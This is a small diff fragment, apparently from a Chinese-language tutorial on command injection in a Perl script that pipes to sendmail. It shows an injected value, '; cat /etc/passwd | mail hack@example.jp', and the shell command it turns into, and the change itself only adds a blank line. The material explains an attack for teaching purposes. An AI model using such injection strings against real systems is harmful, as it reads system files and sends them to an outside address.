@@ -237,6 +237,7 @@ print MALL "From: info@example.com\n"
 ```
 ; cat /etc/passwd | mail hack@example.jp
 ```
+
 程序接收该值，构成一下命令组合
 ```
 | /usr/sbin/sendmail ; cat /etc/passwd | mail hack@example.jp
